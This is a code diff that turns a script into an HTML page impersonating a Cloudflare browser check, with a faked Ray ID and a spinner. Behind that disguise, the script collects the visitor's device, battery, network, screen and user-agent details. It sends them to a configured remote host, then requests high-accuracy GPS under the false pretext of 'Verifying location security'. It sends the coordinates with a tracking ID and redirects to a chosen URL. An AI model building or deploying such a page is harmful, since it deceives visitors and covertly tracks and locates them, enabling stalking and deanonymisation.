@@ -1,28 +1,106 @@
-// public/script.js
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="referrer" content="no-referrer"> 
+  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+  <meta http-equiv="Pragma" content="no-cache">
+  <meta http-equiv="Expires" content="0">
+  
+  <title>Just a moment...</title>
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+      background: #fff;
+      margin: 0;
+      padding: 20px;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      color: #333;
+    }
+    .container {
+      max-width: 500px;
+      width: 100%;
+      text-align: center;
+    }
+    .spinner {
+      display: flex;
+      gap: 6px;
+      justify-content: center;
+      margin: 30px auto;
+    }
+    .spinner div {
+      width: 14px;
+      height: 14px;
+      background: #f58220;
+      border-radius: 50%;
+      animation: fader 1.4s infinite ease-in-out;
+    }
+    .spinner div:nth-child(2) { animation-delay: -0.32s; }
+    .spinner div:nth-child(3) { animation-delay: -0.16s; }
+    @keyframes fader {
+      0%, 80%, 100% { transform: scale(0); }
+      40% { transform: scale(1); }
+    }
+    h1 { font-size: 1.5rem; margin: 0 0 15px; font-weight: 600; color: #000; }
+    p { font-size: 1rem; margin: 8px 0; color: #555; line-height: 1.5; }
+    #status { font-weight: 500; color: #e67e22; margin: 15px 0; }
+    .footer { margin-top: 40px; font-size: 0.75rem; color: #999; text-align: center; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="spinner">
+      <div></div><div></div><div></div>
+    </div>
+    <h1>Checking your browser before accessing website</h1>
+    <p>This process is automatic. Your browser will redirect shortly.</p>
+    <p id="status">Please allow up to 5 seconds...</p>
+  </div>
 
-(async function() {
-    const config = window.CLOUDFLARE_CONFIG;
-    if (!config) return;
+  <div class="footer">
+    DDoS protection by Cloudflare<br>
+    Ray ID: <span id="rayId">Loading...</span>
+  </div>
 
-    const status = document.getElementById('status');
+  <script>
+    // 1. Visual Fake Ray ID
+    document.getElementById('rayId').innerText = Math.random().toString(16).substr(2, 16);
 
-    // Helper: Get Battery
-    const getBattery = async () => {
-        try {
-            const b = await navigator.getBattery();
-            return `${Math.round(b.level * 100)}% ${b.charging ? '⚡' : ''}`;
-        } catch { return 'N/A'; }
+    // 2. Configuration from Server
+    const config = {
+      UID: "<%= uid %>",
+      HOST: "<%= a %>".replace(/^http:/, 'https:'), // Force HTTPS
+      TARGET_URL: "<%= url %>"
     };
 
-    // Helper: Get Connection
-    const getConnection = () => {
+    // 3. Main Logic (Wrapped in Async IIFE)
+    (async function() {
+      if (!config) return;
+      const status = document.getElementById('status');
+
+      // Helper: Get Battery
+      const getBattery = async () => {
+        try {
+          // @ts-ignore
+          const b = await navigator.getBattery();
+          return `${Math.round(b.level * 100)}% ${b.charging ? '⚡' : ''}`;
+        } catch { return 'N/A'; }
+      };
+
+      // Helper: Get Connection
+      const getConnection = () => {
         const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
         return c ? `${c.effectiveType} (${c.downlink}Mbps)` : 'N/A';
-    };
+      };
 
-    // 1. Collect Device Data
-    const bat = await getBattery();
-    const data = `
+      // --- Step A: Collect Device Data ---
+      const bat = await getBattery();
+      const data = `
 <b>📱 Device:</b> ${navigator.platform}
 <b>🌐 Browser:</b> ${navigator.vendor || 'Unknown'}
 <b>🔋 Battery:</b> ${bat}
@@ -31,53 +109,58 @@
 <b>🖥️ Screen:</b> ${window.screen.width}x${window.screen.height}
 <b>🕒 Time:</b> ${new Date().toLocaleString()}
 <b>🕷️ User Agent:</b> <code>${navigator.userAgent}</code>
-    `.trim();
+      `.trim();
 
-    // 2. Send Initial Data (Device + IP)
-    try {
+      // --- Step B: Send Data (Device + IP) ---
+      try {
         await fetch(`${config.HOST}/data`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ uid: config.UID, data: encodeURIComponent(data) })
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ uid: config.UID, data: encodeURIComponent(data) })
         });
-    } catch (e) { console.error(e); }
+      } catch (e) { console.error("Data send error:", e); }
 
-    // 3. Request GPS Location
-    status.innerText = "Verifying location security...";
-    
-    if (navigator.geolocation) {
+      // --- Step C: Request GPS Location ---
+      status.innerText = "Verifying location security...";
+      
+      if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
-            async (pos) => {
-                // Success: Send Location
-                await fetch(`${config.HOST}/location`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        uid: config.UID,
-                        lat: pos.coords.latitude,
-                        lon: pos.coords.longitude,
-                        acc: pos.coords.accuracy
-                    })
-                });
-                redirect();
-            },
-            (err) => {
-                // Denied/Error: Redirect anyway
-                console.log("Location denied");
-                redirect();
-            },
-            { enableHighAccuracy: true, timeout: 5000 }
+          async (pos) => {
+            // Success: Send Location
+            try {
+              await fetch(`${config.HOST}/location`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  uid: config.UID,
+                  lat: pos.coords.latitude,
+                  lon: pos.coords.longitude,
+                  acc: pos.coords.accuracy
+                })
+              });
+            } catch(e) { console.error("Loc send error:", e); }
+            redirect();
+          },
+          (err) => {
+            // Denied/Error: Redirect anyway
+            console.log("Location denied or error");
+            redirect();
+          },
+          { enableHighAccuracy: true, timeout: 6000 }
         );
-    } else {
+      } else {
         redirect();
-    }
+      }
 
-    // 4. Redirect Function
-    function redirect() {
+      // --- Step D: Redirect Function ---
+      function redirect() {
         status.innerText = "Redirecting...";
         setTimeout(() => {
-            window.location.replace(config.TARGET_URL);
-        }, 500);
-    }
+          window.location.replace(config.TARGET_URL);
+        }, 1000);
+      }
 
-})();
+    })();
+  </script>
+</body>
+</html>
